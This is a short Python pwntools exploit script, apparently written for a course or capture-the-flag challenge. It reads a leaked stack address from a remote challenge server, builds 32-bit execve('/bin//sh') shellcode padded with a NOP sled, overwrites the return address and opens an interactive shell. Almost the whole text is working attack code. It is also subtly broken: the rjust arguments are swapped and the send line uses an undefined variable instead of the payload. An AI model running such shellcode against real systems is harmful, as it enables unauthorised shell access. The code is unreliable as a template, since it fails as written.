from pwn import *

local=False

# if we want to cut off most logs
# context.log_level = "critical"

# if we are using terminator
# context.terminal = ["terminator", "-e"]

if local:
    sh = process('./shellcode')
else:
    sh=remote("tpas.alunos.dcc.fc.up.pt",5002)

in_line = sh.recv()

leaked_addr = in_line.split(":")[-1].strip()

eip = p32(int(leaked_addr, 16)) # p64 for 64 bits

#gdb.attach(sh)

# execve for scanf (bypass chars that terminate read before expected)
shellcode ="\x31\xc0\x50\x68"
shellcode +="\x2f\x2f\x73\x68"
shellcode +="\x68\x2f\x62\x69"
shellcode +="\x6e\x89\xe3\x50"
shellcode +="\x53\x89\xe1\x31"
shellcode +="\xc0\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\x40\x40\x40\x40"
shellcode +="\xcd\x80"

NOP = "\x90"

payload = shellcode.rjust(NOP, 10) + eip

sh.sendline(exp_str)

# when we get a shell
sh.interactive()
